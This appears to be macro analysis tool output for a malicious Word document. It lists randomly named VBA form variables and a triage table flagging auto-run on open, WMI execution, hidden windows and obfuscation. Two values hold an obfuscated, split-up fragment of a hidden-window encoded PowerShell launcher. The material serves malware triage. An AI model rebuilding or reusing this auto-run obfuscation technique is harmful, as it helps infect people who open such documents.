+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Dxcdjsrrnw'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'Aftcurifh'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Ficueeabpck'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'Osjxwkzzy'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Wkhldyrd'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'43'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Fmgsnpdkhc'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'P'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Wugynnmux'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'Xlochkjxxph'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Grrjpzmzpvq'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'  '
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Banzydziriljk'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'o//====dsfnnJJJsm388//=w//====dsfnnJJJsm388//=e//====dsfnnJJJsm388//=r//====dsfnnJJJsm388//=s//====dsfnnJJJsm388//=h//====dsfnnJJJsm388//=el//====dsfnnJJJsm388//=l//====dsfnnJJJsm388//= //====dsfnnJJJsm388//=-//====dsfnnJJJsm388//=w//====dsfnnJJJsm388//= //====dsfnnJJJsm388//=h//====dsfnnJJJsm388//=i'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Svndpgudl'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'd//====dsfnnJJJsm388//=d//====dsfnnJJJsm388//=e//====dsfnnJJJsm388//=n//====dsfnnJJJsm388//= //====dsfnnJJJsm388//=-//====dsfnnJJJsm388//=e//====dsfnnJJJsm388//=n '
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Ypofkmlub'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Egthntrg'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Wxyyjpiga'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Hglmhshc'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'Votcymrhgpjqb'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Cvlpoddz'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'0'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Ydcusjqmhil'" IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'Fletrfawfuzto'
++----------+-------------+-------------------------------------------+
+|Type      |Keyword      |Description                                |
++----------+-------------+-------------------------------------------+
+|AutoExec  |Document_open|Runs when the Word or Publisher document is|
+|          |             |opened                                     |
+|Suspicious|Create       |May execute file or a system command through|
+|          |             |WMI                                        |
+|Suspicious|showwindow   |May hide the application                   |
+|Suspicious|GetObject    |May get an OLE object with a running instance|
+|Suspicious|ChrW         |May attempt to obfuscate specific strings  |
+|          |             |(use option --deobf to deobfuscate)        |
+|Suspicious|Hex Strings  |Hex-encoded strings were detected, may be  |
+|          |             |used to obfuscate strings (option --decode to|
+|          |             |see all)                                   |
+|Suspicious|Base64 Strings|Base64-encoded strings were detected, may be|
+|          |             |used to obfuscate strings (option --decode to|
+|          |             |see all)                                   |
++----------+-------------+-------------------------------------------+
